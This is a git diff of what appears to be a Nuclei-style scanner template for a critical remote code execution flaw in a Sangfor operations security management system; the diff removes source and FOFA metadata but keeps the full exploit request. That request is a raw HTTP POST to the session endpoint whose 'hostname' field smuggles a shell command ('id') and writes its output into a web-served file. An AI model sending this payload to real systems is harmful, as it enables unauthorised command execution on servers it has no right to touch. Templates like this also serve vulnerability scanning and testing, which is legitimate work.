@@ -3,12 +3,8 @@ info:
   name: 深信服运维安全管理系统 session 存在远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wloivtgnmkpvo5hl'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wloivtgnmkpvo5hl
-    fofa: product="SANGFOR-运维安全管理系统"
 http:
 - raw:
   - 'POST /isomp-protocol/protocol/session HTTP/1.1
@@ -48,9 +44,7 @@ http:
     Connection: keep-alive
 
 
-    hostname=;id>/usr/local/tomcat/webapps/fort/trust/js/hello.txt;&port=11&protocol=x11&resolution=1*11&session_path=1&sid=1
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1769350928522-46980df9-c130-48fa-abbc-89ab1467f811.png)'
+    hostname=;id>/usr/local/tomcat/webapps/fort/trust/js/hello.txt;&port=11&protocol=x11&resolution=1*11&session_path=1&sid=1'
   redirects: false
   matchers:
   - status:
